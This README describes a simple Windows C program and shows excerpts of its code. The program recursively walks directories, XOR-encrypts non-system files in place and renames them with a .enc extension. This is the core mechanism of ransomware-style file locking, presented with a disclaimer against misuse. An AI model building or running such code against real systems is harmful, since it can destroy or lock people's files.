# Simple Recursive File Encryption

**Disclaimer**:  
*This program has the potential to destroy an entire file-system if*  
*you go around aimlessly messing around with the code. Be careful and*  
*don't use it for any malicious activities.*  

This program uses the Windows API's **FindFirstFile** function in order to  
recursively walk a directory and located non-system files. The files are then  
encrypted using a trivial xor encryption technique.
```
(...)

GetFullPathName(dir_path, MAX_PATH, abs_dir_path, NULL);
snprintf(wildcard, sizeof(wildcard), "%s/*", abs_dir_path);

if ((fHandle = FindFirstFile(wildcard, &findData)) == INVALID_HANDLE_VALUE)
{
    return;
}

(...)
```

Once the target file is found, the program begins to xor encrypt the file.
```
(...)

file_size = fread(contents, sizeof(char), file_size, fp);
rewind(fp);

char* tmp = contents;
for (unsigned i = 0; i < file_size; tmp++, i++)
{
    size_t length = strlen(encyption_key);
    *tmp ^= encyption_key[i % length];
}

fwrite(contents, 1, file_size, fp);

(...)
```

The files are then renamed to additionally have the *.enc* extension to signify  
that they are in fact encrypted.
```
(...)

size_t size = sizeof(char) * (strlen(file) + 5);
char* new_file = (char *)malloc(size);

memset(new_file, 0, size);
snprintf(new_file, size, "%s.enc", file);

rename(file, new_file);
free(new_file);

(...)
```
